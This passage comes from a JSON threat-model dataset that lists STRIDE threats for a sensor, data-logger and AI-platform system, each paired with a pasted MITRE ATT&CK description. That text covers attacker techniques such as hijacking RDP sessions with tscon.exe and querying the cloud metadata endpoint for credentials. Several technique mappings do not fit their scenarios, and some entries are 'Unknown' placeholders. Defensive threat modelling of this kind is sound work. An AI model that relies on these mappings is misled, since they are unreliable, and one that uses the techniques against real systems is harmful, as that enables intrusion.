                "technique_id": "T1578"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee disputes having made changes to the AI/ML model configurations within the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Lack of comprehensive logging.",
                    "Role": "System",
                    "Condition": "System does not log user actions comprehensively."
                },
                {
                    "Assumption": "Inadequate access control measures.",
                    "Role": "System",
                    "Condition": "Multiple users share access credentials or roles."
                },
                {
                    "Assumption": "No user accountability frameworks.",
                    "Role": "Policy",
                    "Condition": "No frameworks in place to hold individual users accountable for their actions."
                }
            ],
            "Potential Impact": "Difficulty in attributing changes, leading to operational and security challenges.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging deficiency",
                "access control",
                "model configuration"
            ],
            "mitre_technique": {
                "name": "Group Policy Modification",
                "description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)",
                "id": "attack-pattern--5d2be8b9-d24c-4e98-83bf-2f5f79477163",
                "technique_id": "T1484.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes logs to obfuscate changes made to the data within the system.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not immutable or adequately protected.",
                    "Role": "System",
                    "Condition": "Logs can be altered without detection."
                },
                {
                    "Assumption": "Insufficient backup and redundancy mechanisms.",
                    "Role": "System",
                    "Condition": "Logs are not adequately backed up."
                },
                {
                    "Assumption": "Privilege escalation possible within the system.",
                    "Role": "Attacker",
                    "Condition": "Attacker can escalate privileges to gain log modification capabilities."
                }
            ],
            "Potential Impact": "Inability to perform reliable forensic analysis following an incident, impacting system integrity and accountability.",
            "MITRE ATT&CK Keywords": [
                "log deletion",
                "repudiation",
                "privilege escalation",
                "data obfuscation"
            ],
            "mitre_technique": {
                "name": "Remote Desktop Protocol",
                "description": "Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.\n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)\n\nAdversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\\windows\\system32\\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)",
                "id": "attack-pattern--51dea151-0898-4a45-967c-3ebee0420484",
                "technique_id": "T1076"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny unauthorized updates made to sensor metadata that influence predictive models.",
            "Assumptions": [
                {
                    "Assumption": "Weak monitoring and validation of sensor metadata.",
                    "Role": "System",
                    "Condition": "No rigorous checks on metadata updates."
                },
                {
                    "Assumption": "Manipulation of audit trails.",
                    "Role": "Insider",
                    "Condition": "Insiders can hijack audit trails to cover tracks."
                },
                {
                    "Assumption": "Lack of granular access controls.",
                    "Role": "System",
                    "Condition": "System doesn\u2019t restrict access based on need-to-know basis."
                }
            ],
            "Potential Impact": "Misaligned model outcomes due to incorrect metadata affecting predictive accuracy.",
            "MITRE ATT&CK Keywords": [
                "metadata manipulation",
                "repudiation",
                "insider threat",
                "predictive models"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts the data in transit between sensors and the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "System",
                    "Condition": "Unencrypted data transmission protocols used."
                },
                {
                    "Assumption": "Access to the network used for data transmission.",
                    "Role": "Attacker",
                    "Condition": "Attacker can access or compromise the transmission network."
                },
                {
                    "Assumption": "Lack of detection mechanisms for unauthorized access.",
                    "Role": "System",
                    "Condition": "No active monitoring of data transmission paths."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of operational data, which could be used for competitive or malicious purposes.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "information disclosure",
                "network",
                "data transit"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Access to anonymized but re-identifiable data through weaknesses in the Anon Agent.",
            "Assumptions": [
                {
                    "Assumption": "Weak privacy-preserving techniques.",
                    "Role": "System",
                    "Condition": "Poorly implemented anonymization techniques."
                },
                {
                    "Assumption": "Combination of multiple datasets to re-identify information.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to multiple related datasets."
                },
                {
                    "Assumption": "Lack of continuous privacy audits.",
                    "Role": "Compliance",
                    "Condition": "No continuous privacy review and testing."
                }
            ],
            "Potential Impact": "Privacy breaches and exposure of sensitive information, leading to regulatory and reputational damage.",
            "MITRE ATT&CK Keywords": [
                "re-identification",
                "information disclosure",
                "anonymity weakness",
                "data linking"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to the metadata and sensitive operational details stored in the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Weak access control measures for metadata.",
                    "Role": "System",
                    "Condition": "Access controls not enforced rigorously."
                },
                {
                    "Assumption": "Insufficient encryption of sensitive data.",
                    "Role": "System",
                    "Condition": "Data is stored in plaintext or with weak encryption."
                },
                {
                    "Assumption": "Shared access credentials among users.",
                    "Role": "Policy",
                    "Condition": "Multiple users sharing access credentials."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational information, potentially leading to industrial espionage or sabotage.",
            "MITRE ATT&CK Keywords": [
                "data breach",
                "metadata access",
                "information disclosure",
                "cloud"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A Distributed Denial of Service (DDoS) attack disrupts the data flow between the Data Logger and the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Lack of robust DDoS protection mechanisms.",
                    "Role": "Infrastructure",
                    "Condition": "No DDoS mitigation strategies in place."
                },
                {
                    "Assumption": "Attackers have sufficient resources for a large-scale DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "Attackers can coordinate a massive DDoS attack."
                },
                {
                    "Assumption": "Network infrastructure vulnerabilities.",
                    "Role": "System",
                    "Condition": "Weaknesses in network infrastructure allowing DDoS exploitation."
                }
            ],
            "Potential Impact": "Interrupted data flow and potential loss of data, affecting the system's ability to predict and optimize power flow.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network disruption",
                "denial of service",
                "data flow interruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware causes the Data Logger to become unresponsive, halting data collection from sensors.",
            "Assumptions": [
                {
                    "Assumption": "Data Logger lacks advanced malware protection.",
                    "Role": "System",
                    "Condition": "No effective anti-malware implementation."
                },
                {
                    "Assumption": "Attackers can deploy malware on the network.",
                    "Role": "Attacker",
                    "Condition": "Network can be penetrated by malware."
                },
                {
                    "Assumption": "Infrequent system updates and patching.",
                    "Role": "Maintenance",
                    "Condition": "System is not regularly updated or patched."
                }
            ],
            "Potential Impact": "Disruption of data collection leading to gaps in predictive maintenance and power optimization.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "denial of service",
                "unresponsive device",
                "data collection halt"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Overload of the TOREADOR platform's resources by an attacker, affecting its ability to process data and train models.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient resource allocation and management.",
                    "Role": "System",
                    "Condition": "Resources are not adequately managed."
                },
                {
                    "Assumption": "Lack of monitoring and alerting on resource usage.",
                    "Role": "System",
                    "Condition": "No effective monitoring of resource utilization."
                },
                {
                    "Assumption": "Exploitable vulnerabilities within the cloud infrastructure.",
                    "Role": "System",
                    "Condition": "Vulnerabilities that can be exploited to overload the system."
                }
            ],
            "Potential Impact": "Disruption to model training and validation, leading to delayed or inaccurate predictions.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "cloud disruption",
                "denial of service",
                "model training disruption"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability to gain admin access to the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Existence of unpatched vulnerabilities.",
                    "Role": "System",
                    "Condition": "Platform contains unpatched, exploitable vulnerabilities."
                },
                {
                    "Assumption": "Insufficient privilege segmentation.",
                    "Role": "System",
                    "Condition": "Privileges are not granularly segmented."
                },
                {
                    "Assumption": "Lack of regular penetration testing.",
                    "Role": "Compliance",
                    "Condition": "Regular security testing is not performed."
                }
            ],
            "Potential Impact": "Complete control over the system, allowing data manipulation and potentially shutting down operations.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "cloud",
                "administrative access",
                "system control"
            ],
            "mitre_technique": {
                "name": "Modify Cloud Compute Infrastructure",
                "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
                "technique_id": "T1578"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider uses legitimate but over-provisioned access rights to manipulate AI/ML model parameters.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate role-based access control.",
                    "Role": "System",
                    "Condition": "Role-based access policies are not enforced strictly."
                },
                {
                    "Assumption": "Lack of oversight on access rights.",
                    "Role": "Policy",
                    "Condition": "No regular review of access rights."
                },
                {
                    "Assumption": "Weak monitoring of user activities.",
                    "Role": "System",
                    "Condition": "Insufficient real-time monitoring of user actions."
                }
            ],
            "Potential Impact": "Manipulation of model outputs, leading to incorrect predictions and operational impacts.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "privilege misuse",
                "model manipulation",
                "access control"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of a zero-day vulnerability in the Data Logger to execute arbitrary code with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Existence of unknown or unpatched zero-day vulnerabilities.",
                    "Role": "System",
                    "Condition": "System contains zero-day vulnerabilities."
                },
                {
                    "Assumption": "Lack of comprehensive vulnerability scanning.",
                    "Role": "Compliance",
                    "Condition": "No regular vulnerability scanning."
                },
                {
                    "Assumption": "Insufficient monitoring for anomalous behavior.",
                    "Role": "System",
                    "Condition": "No active monitoring for abnormal activities."
                }
            ],
            "Potential Impact": "Complete compromise of data integrity and confidentiality within the Data Logger environment.",
            "MITRE ATT&CK Keywords": [
                "zero-day",
                "code execution",
                "privilege escalation",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "5",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a sensor to feed false data into the system.",
            "Assumptions": [
                {
                    "Assumption": "Sensors lack strong mutual authentication.",
                    "Role": "System Designer",
                    "Condition": "True if sensors use simple or no authentication methods."
                },
                {
                    "Assumption": "The attacker has network access to intercept or inject packets.",
                    "Role": "Attacker",
                    "Condition": "True if the network is unprotected or accessible."
                }
            ],
            "Potential Impact": "False data can lead to inaccurate predictions and reduce efficiency.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "sensor",
                "network",
                "imposter"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An unauthorized user accesses the dashboard using a stolen credential.",
            "Assumptions": [
                {
                    "Assumption": "Users reuse passwords or use weak passwords.",
                    "Role": "User",
                    "Condition": "True if password policies are weak or unenforced."
                },
                {
                    "Assumption": "No multi-factor authentication (MFA) is in place.",
                    "Role": "System Administrator",
                    "Condition": "True if MFA is not implemented."
                }
            ],
            "Potential Impact": "Confidential data leakage and potential manipulation of predictive models.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "dashboard",
                "credential",
                "authentication"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Anonymity Agent is spoofed to accept data from an unverified source.",
            "Assumptions": [
                {
                    "Assumption": "Anonymity Agent does not verify the source of incoming data.",
                    "Role": "System Developer",
                    "Condition": "True if source verification is not implemented."
                },
                {
                    "Assumption": "The attacker can send data that passes superficial checks.",
                    "Role": "Attacker",
                    "Condition": "True if superficial validation can be easily bypassed."
                }
            ],
            "Potential Impact": "Compromised data integrity and potential model training with malicious inputs.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "agent",
                "data source",
                "verification"
            ],
            "mitre_technique": {
                "name": "Launch Daemon",
                "description": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)",
                "id": "attack-pattern--573ad264-1371-4ae0-8482-d2673b719dba",
                "technique_id": "T1543.004"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies sensor data in transit to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Data is not encrypted during transmission.",
                    "Role": "System Designer",
                    "Condition": "True if encryption is not implemented."
                },
                {
                    "Assumption": "The network is accessible to the attacker.",
                    "Role": "Attacker",
                    "Condition": "True if network access is not restricted or monitored."
                }
            ],
            "Potential Impact": "Corrupted data leads to inaccurate predictions and decreases system reliability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data in transit",
                "encryption",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
